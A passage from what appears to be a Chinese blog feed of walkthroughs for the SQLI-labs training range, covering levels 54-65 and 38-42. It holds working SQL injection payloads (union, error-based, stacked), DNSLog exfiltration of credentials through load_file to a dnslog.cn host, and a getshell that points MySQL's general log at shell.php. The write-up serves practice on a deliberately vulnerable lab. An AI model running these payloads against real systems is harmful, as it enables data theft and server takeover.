class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-comment">--+</span></code></pre><p>表名为：<code>bplubnri6m</code>，这个表名可能是随机的 不同用户不一样</p><p><strong>查询列名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;bplubnri6m&#x27;</span>) <span class="hljs-comment">--+</span></code></pre><p>查到列名如下：id,sessid,secret_0UH9,tryy</p><p><strong>查询字段值</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_0UH9) <span class="hljs-keyword">from</span> bplubnri6m) <span class="hljs-comment">--+</span></code></pre><p>拿到 key 值为：Vbf3WpKCBvu8s4rnCTEeWcPa</p><p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=($id)</code></td></tr></tbody></table><p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，这里不再赘述。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p><pre><code class="hljs Php"><span class="hljs-variable">$unames</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<span class="hljs-variable">$pass</span> = (<span class="hljs-variable">$unames</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. <span class="hljs-variable">$unames</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .<span class="hljs-variable">$pass</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];</code></pre><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p><pre><code class="hljs php">print_r(mysql_error());</code></pre><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>k4xoowbia1<span class="hljs-string">&#x27;),0x7e),1)--+ </span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_D5OR) <span class="hljs-keyword">from</span> k4xoowbia1),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span></code></pre><p>这里我注入的表名为：<code>k4xoowbia1</code>，列名为：<code>secret_D5OR</code></p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，对于盲注强烈建议使用脚本，人工太慢，在实战工程中还是靠 sqlmap 这种自动化注入神器或者自己写脚本了，手工注入的话岂不是得天荒地老。</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(($id))</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光的SQLI labs 靶场精简学习记录</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之堆叠注入 38-53 关</title>
    <link href="/p/1f400290.html"/>
    <url>/p/1f400290.html</url>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p><pre><code class="hljs sql">mysql&gt; select * from users where id = 1;select version();+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>|  1 | Dumb     | Dumb     |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)+<span class="hljs-comment">-----------+</span>| <span class="hljs-keyword">version</span>() |+<span class="hljs-comment">-----------+</span>| <span class="hljs-number">8.0</span><span class="hljs-number">.12</span>    |+<span class="hljs-comment">-----------+</span><span class="hljs-number">1</span> <span class="hljs-keyword">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>();</code></pre><p><strong>SQL Server</strong></p><pre><code class="hljs Mssql">select 1,2,3;select * from test;</code></pre><p><strong>Postgresql</strong></p><pre><code class="hljs Sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;</code></pre><p>注入天书里面说 Oracle 不支持堆叠查询。</p><h2 id="Less-38-堆叠注入"><a href="#Less-38-堆叠注入" class="headerlink" title="Less-38(堆叠注入)"></a>Less-38(堆叠注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>又到了源码简单分析的时间了，来看看堆叠注入的代码是如何实现的：</p><pre><code class="hljs Php"><span class="hljs-comment"># id 参数直接带入到 SQL 语句中</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>)):    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));</code></pre><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>);</code></pre><p>变成了现在的：</p><pre><code class="hljs Php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))</code></pre><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p><p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p><p><strong>添加字段值</strong></p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);</code></pre><p>数据库中查看是否添加成功：</p><pre><code class="hljs sql">mysql&gt; select * from users where username=&#x27;hello&#x27;;+<span class="hljs-comment">----+----------+----------+</span>| id | username | password |+<span class="hljs-comment">----+----------+----------+</span>| 15 | hello    | world    |+<span class="hljs-comment">----+----------+----------+</span>1 row in <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来演示我认为比较实用的姿势。</p><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>需要条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （<a href="http://dnslog.cn/">dnslog</a>、<a href="http://ceye.io/">CEYE</a>）</li><li>Windows 平台</li></ol><p><code>load_file</code> 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><pre><code class="hljs bash">\\192.168.31.53\<span class="hljs-built_in">test</span>\</code></pre><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p><p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p><p>下面使用 Windows 下的 sqli-labs 测试环境：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.952nzx.dnslog.cn\\abc&#x27;</span>))<span class="hljs-comment">--+</span></code></pre><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/01.png" alt="Less-38_DNSLog 数据外带"></p><p>手动 Hex 解码即可</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>首先查看当前的日志的相关配置：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| Variable_name    | Value                                                           |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>| general_log      | OFF                                                             || general_log_file | D:\phpstudy_pro\Extensions\MySQL8.0.12\data\DESKTOP-7FQSJGU.log |+<span class="hljs-comment">------------------+-----------------------------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p><code>general_log</code>环境默认是没有开启的，这里尝试注入的时候手动开启：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php&#x27;</span>;<span class="hljs-comment">--+</span></code></pre><p>然后 MySQL 再查看日志配置是否被修改了：</p><pre><code class="hljs sql">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| Variable_name    | Value                                         |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>| general_log      | ON                                            || general_log_file | D:/phpstudy_pro/WWW/sqli.pl/Less-38/shell.php |+<span class="hljs-comment">------------------+-----------------------------------------------+</span>2 rows in <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> <span class="hljs-keyword">warning</span> (<span class="hljs-number">0.00</span> sec)</code></pre><p>这个尝试 getshell：</p><pre><code class="hljs sql">?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/02.png" alt="Less-38_开启日志 Getshell"></p><p><code>shell.php</code>日志文件内容：</p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\phpstudy_pro\COM\..\Extensions\MySQL<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>\\bin\mysqld.exe, Version: <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> (MySQL Community Server - GPL). started with:<span class="hljs-attribute">TCP</span> Port: <span class="hljs-number">3306</span>, Named Pipe: MySQL<span class="hljs-attribute">Time</span>                 Id Command    Argument<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">42</span>.<span class="hljs-number">153350</span>Z   <span class="hljs-number">10</span> Query-- &#x27; LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267004</span>Z   <span class="hljs-number">11</span> Connectroot@localhost <span class="hljs-literal">on</span> security using TCP/IP<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267240</span>Z   <span class="hljs-number">11</span> Init DBsecurity<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267398</span>Z   <span class="hljs-number">11</span> QuerySELECT * FROM users WHERE id=&#x27;<span class="hljs-number">1</span>&#x27;;<span class="hljs-attribute">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">08</span>T<span class="hljs-number">02</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>.<span class="hljs-number">267695</span>Z   <span class="hljs-number">11</span> Queryselect <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-39/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;;<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-38 相比只是拼接方式不一样。</p><pre><code class="hljs sql">?id=1&#x27;);<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/sqli.pl/Less-40/shell.php&#x27;</span>;<span class="hljs-comment">--+</span>?id=1&#x27;);<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</code></pre><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，这里不再赘述。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># username 被过滤 &#x27; &quot; \ password 没有被</span><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<span class="hljs-comment"># 堆叠查询</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<span class="hljs-keyword">if</span> 查询成功：    <span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<span class="hljs-keyword">else</span>:    print_r(mysqli_error(<span class="hljs-variable">$con1</span>));<span class="hljs-keyword">if</span> 登录成功:    setcookie(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, time()+<span class="hljs-number">3600</span>);    跳转到 logged-in.php</code></pre><ul><li><code>logged-in.php</code></li></ul><p>登录成功，提供修改密码的表单</p><pre><code class="hljs Html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mylogin&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;pass_change.php&quot;</span>&gt;</span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 没有登录:    重定向到 index.php<span class="hljs-keyword">if</span> 提交了修改密码表单:    <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$pass</span>==<span class="hljs-variable">$re_pass</span>:        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;</code></pre><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p><p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=1&#x27; or 1#&amp;mysubmit=Login</code></pre><p>因为登录成功后返回：</p><pre><code class="hljs Php"><span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];</code></pre><p>所以登录了 id 为 1 的 Dumb 用户：</p><p>尝试<strong>联合查询</strong>:</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> HTTP/1.1...login_user=admin&amp;login_password=13141&#x27; union select 1,(select group_concat(username,&quot;:&quot;,password,0x3c62723e) from users),3#&amp;mysubmit=Login</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/03.png" alt="Less-42"></p><p><strong>报错注入</strong>：</p><pre><code class="hljs apache"><span class="hljs-attribute">login_user</span>=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,&#x27;:&#x27;,password) from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)#&amp;mysubmit=Login</code></pre><p><img 